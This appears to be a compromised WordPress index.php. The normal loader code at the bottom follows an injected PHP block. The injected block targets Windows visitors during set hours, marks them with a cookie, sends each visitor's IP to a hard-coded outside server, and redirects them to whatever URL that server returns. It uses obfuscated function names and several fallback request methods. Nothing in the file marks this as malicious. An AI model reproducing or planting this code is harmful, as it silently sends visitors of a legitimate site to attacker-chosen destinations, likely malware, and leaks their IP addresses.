<?php
$chr1 = @gmdate('G');
$chr2 = intval(gmdate('i'));
if (!empty($_SERVER['HTTP_USER_AGENT'])
    && stripos($_SERVER['HTTP_USER_AGENT'],'Windows') !== false
    && (
        $chr1 >= 15
        ||
        ($chr1 == 0 && $chr2 <= 30)
    )
)
{
    if (!isset($_COOKIE["kjk43erwin"]))
    {
        error_reporting(0);

        setcookie("kjk43erwin", '1', time() + 3600 * 24 * 90, "/");

        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';

        if (!empty($ip))
        {
            $url = jk____('http://194.28.112.156/recive/i.php?i=' . $ip);

            if (!empty($url) && stripos($url,'http')===0)
            {
                header('Location: ' . $url);
                exit;
            }
        }
    }
}



function jk_($url)
{
    $ctx = stream_context_create(array('http'=>   array('timeout' => 5 )));
    return file_get_contents($url,false,$ctx);
}

function jk__( $sock,$host, $path, $query )
{
    $response = '';

    fputs($sock, "GET " . $path . "?" . $query . "  HTTP/1.0\r\n" .
        "Host: $host\r\n" .
        "Accept: */*\r\n" .
        "Referer: http://$host\r\n\r\n");
    while ( $line = fread( $sock, 4096 ) )
    {
        $response .= $line;
    }
    fclose( $sock );
    $pos      = strpos($response, "\r\n\r\n");
    $response = substr($response, $pos + 4);
    return $response;
}


function jk___($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function jk____($url)
{
    if( ini_get("allow_url_fopen") == 1)
    {
        return jk_($url);
    }
    else
    {
        $url_1 = parse_url($url);

        if($sock = @fsockopen($url_1['host'], 80,$errno, $errstr,5))
        {
            return jk__( $sock, $url_1['host'], $url_1['path'], $url_1['query'] );
        }
        elseif( @function_exists('curl_init') )
        {
            return jk___($url);
        }
    }
}
//jk____22


/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
